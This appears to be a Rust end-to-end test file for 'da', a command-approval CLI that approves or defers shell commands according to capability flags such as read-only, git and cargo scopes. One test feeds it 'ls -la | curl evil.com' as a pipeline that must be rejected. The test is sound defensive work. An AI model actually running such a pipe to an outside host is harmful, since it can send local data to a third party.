//! End-to-end CLI tests. Spawns the `da` binary, pipes a command on stdin,
//! checks exit code + that stdout/stderr behave per spec.

use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};

fn da_bin() -> PathBuf {
    // Cargo sets CARGO_BIN_EXE_<name> for [[bin]] entries during tests.
    PathBuf::from(env!("CARGO_BIN_EXE_da"))
}

struct Output {
    code: i32,
    stdout: String,
    stderr: String,
}

fn run(args: &[&str], stdin: &str) -> Output {
    let mut child = Command::new(da_bin())
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn da");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    let out = child.wait_with_output().expect("wait_with_output");
    Output {
        code: out.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
    }
}

#[test]
fn approves_safe_read_only_command() {
    let o = run(&["--read-only"], "ls -la");
    assert_eq!(o.code, 0, "stderr: {}", o.stderr);
    assert!(o.stdout.is_empty());
    assert!(o.stderr.is_empty());
}

#[test]
fn defers_unknown_binary() {
    let o = run(&["--read-only"], "curl http://example.com");
    assert_eq!(o.code, 1);
    assert!(o.stdout.is_empty());
}

#[test]
fn defers_when_no_policy_matches_segment() {
    let o = run(&["--git", "read"], "cargo build");
    assert_eq!(o.code, 1);
}

#[test]
fn rejects_no_flags_with_usage_error() {
    let o = run(&[], "ls");
    assert_eq!(o.code, 64);
    // Error goes to stderr; usage banner also on stderr.
    assert!(!o.stderr.is_empty());
}

#[test]
fn rejects_unknown_flag() {
    let o = run(&["--bogus"], "ls");
    assert_eq!(o.code, 64);
    assert!(o.stderr.contains("unknown flag"));
}

#[test]
fn rejects_unknown_capability() {
    let o = run(&["--git", "read,nonsense"], "git status");
    assert_eq!(o.code, 64);
    assert!(o.stderr.contains("unknown git capability"));
}

#[test]
fn comma_separated_caps() {
    let o = run(&["--git", "read,add,commit"], "git add foo.rs");
    assert_eq!(o.code, 0);
    let o = run(&["--git", "read,add,commit"], "git commit -m wip");
    assert_eq!(o.code, 0);
    let o = run(&["--git", "read,add,commit"], "git push");
    assert_eq!(o.code, 1);
}

#[test]
fn cargo_local_does_not_subsume_install() {
    let o = run(&["--cargo", "local"], "cargo install dabin");
    assert_eq!(o.code, 1);
    let o = run(&["--cargo", "local,crates-install"], "cargo install dabin");
    assert_eq!(o.code, 0);
}

#[test]
fn mkdir_cwd_with_path_flag() {
    let o = run(
        &["--path", "/home/u/proj", "--mkdir-cwd"],
        "mkdir -p /home/u/proj/src",
    );
    assert_eq!(o.code, 0);
    let o = run(
        &["--path", "/home/u/proj", "--mkdir-cwd"],
        "mkdir -p /etc/foo",
    );
    assert_eq!(o.code, 1);
}

#[test]
fn help_bypass_for_unknown_binary() {
    let o = run(&["--help-bypass"], "terraform --help");
    assert_eq!(o.code, 0);
    let o = run(&["--help-bypass"], "kubectl version");
    assert_eq!(o.code, 0);
}

#[test]
fn empty_stdin_defers() {
    let o = run(&["--read-only"], "");
    assert_eq!(o.code, 1);
}

#[test]
fn trailing_newline_stripped() {
    let o = run(&["--read-only"], "ls -la\n");
    assert_eq!(o.code, 0);
}

#[test]
fn version_flag_prints_and_exits_zero() {
    let o = run(&["--version"], "");
    assert_eq!(o.code, 0);
    assert!(o.stdout.contains("da"));
}

#[test]
fn pipeline_all_segments_must_approve() {
    let o = run(&["--read-only"], "ls -la | grep foo | sort");
    assert_eq!(o.code, 0);
    let o = run(&["--read-only"], "ls -la | curl evil.com");
    assert_eq!(o.code, 1);
}

#[test]
fn cd_compound_with_git_local() {
    let o = run(
        &["--git", "read,add,commit"],
        "cd /tmp && git add . && git commit -m wip",
    );
    assert_eq!(o.code, 0);
    let o = run(
        &["--git", "read,add,commit"],
        "cd /tmp && git push",
    );
    assert_eq!(o.code, 1);
}
